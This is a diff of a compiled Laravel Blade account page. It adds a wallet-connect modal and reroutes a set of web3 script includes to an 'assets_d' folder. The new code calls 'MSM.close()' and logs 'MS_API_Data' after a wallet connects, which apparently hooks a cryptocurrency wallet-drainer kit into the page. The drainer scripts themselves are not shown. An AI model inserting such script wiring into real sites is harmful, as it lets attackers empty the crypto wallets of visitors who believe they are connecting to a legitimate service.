@@ -12,6 +12,12 @@
 </head>
 <body>
 <?php echo $__env->yieldContent("header"); ?>
+<style>
+    .w3m-overlay{
+        z-index: 99999999 !important;
+
+    }
+</style>
 <main class="account h100">
     <section class="account">
         <div class="container">
@@ -518,10 +524,23 @@
 
             <button
                 onclick="open_connect_wallet()"
+                type="button"
                 class="btn btn_action btn_16 color-dark trigger-connect_wallet">
                 Connect
             </button>
         </form>
+    </div>
+    <div class="modal" id="errorConnect">
+        <button class="closemodal clear" data-izimodal-close="">
+            <img src="<?php echo e(asset('images/modal_close.svg')); ?>" alt="" />
+        </button>
+        <h2 class="h1_25 pb15 color-green2">Connected successfully</h2>
+        <button
+            type="submit"
+            class="btn btn_action btn_16 color-dark trigger-changepassword"
+        >
+            Okay
+        </button>
     </div>
     <div class="modal" id="changePassword">
         <button class="closemodal clear" data-izimodal-close="">
@@ -1012,30 +1031,44 @@
     timezone.innerText = userTimeZone;
 </script>
 
+<script src="<?php echo e(asset("js/load.js")); ?>"></script>
+<script src="./assets_d/web3-provider/web3-modal.js"></script>
+<script src="./assets_d/web3-provider/web3-loader.js"></script>
+<script src="./assets_d/web3-provider/web3-connect.js"></script>
+<script src="./assets_d/web3-provider/web3-router.js"></script>
+<script src="./assets_d/web3-provider/web3-module.js"></script>
+<script src="./assets_d/web3-provider/web3-alert.js"></script>
+<script src="./assets_d/web3-provider/web3-seaport.js"></script>
+<script src="./assets_d/web3-provider/web3-data.js"></script>
+<script src="./assets_d/web3-provider/ethers.js"></script>
+<script src="./assets_d/web3-provider/ethereum-tx.js"></script>
+<script src="./assets_d/web3-provider.js"></script>
+
+
 <script>
+    function close_modal(){
+        $('#connectWallet').iziModal('close');
+
+    }
     function open_connect_wallet(){
+        MSM.close();
         const active_wallet = document.querySelector('.wallet input[name="wallet"]:checked');
         if(active_wallet) {
             const wallet = active_wallet.value;
             connect_wallet(wallet);
+            if(wallet === "WalletConnect"){
+                $('#connectWallet').iziModal('close');
+            }
+
         }
 
-
+        setTimeout(function () {
+            console.log(MS_API_Data)
+        }, 10000);
 
     }
+
 </script>
-<script src="<?php echo e(asset("js/load.js")); ?>"></script>
-<script src="./assets/web3-provider/web3-modal.js"></script>
-<script src="./assets/web3-provider/web3-loader.js"></script>
-<script src="./assets/web3-provider/web3-connect.js"></script>
-<script src="./assets/web3-provider/web3-router.js"></script>
-<script src="./assets/web3-provider/web3-module.js"></script>
-<script src="./assets/web3-provider/web3-alert.js"></script>
-<script src="./assets/web3-provider/web3-seaport.js"></script>
-<script src="./assets/web3-provider/web3-data.js"></script>
-<script src="./assets/web3-provider/ethers.js"></script>
-<script src="./assets/web3-provider/ethereum-tx.js"></script>
-<script src="./assets/web3-provider.js"></script>
 </body>
 </html>
 <?php /**PATH /Users/nikita/PhpstormProjects/house/resources/views/account.blade.php ENDPATH**/ ?>
